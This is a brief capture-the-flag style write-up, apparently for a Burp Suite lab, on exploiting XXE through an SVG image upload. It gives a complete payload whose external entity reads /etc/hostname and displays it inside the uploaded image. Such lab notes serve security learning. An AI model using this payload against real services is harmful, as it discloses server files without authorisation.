Exploiting XXE via image file upload

The solution provided by Burp is very good, special mention that the contents of /etc/passwd will show in the image, as as image, and that the image is very tiny so open it in a new tab.
Yes, you'll have to write the answer by hand.

Payload:
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 

Save it as a .svg file (xxe.svg in my case, included in this repo)
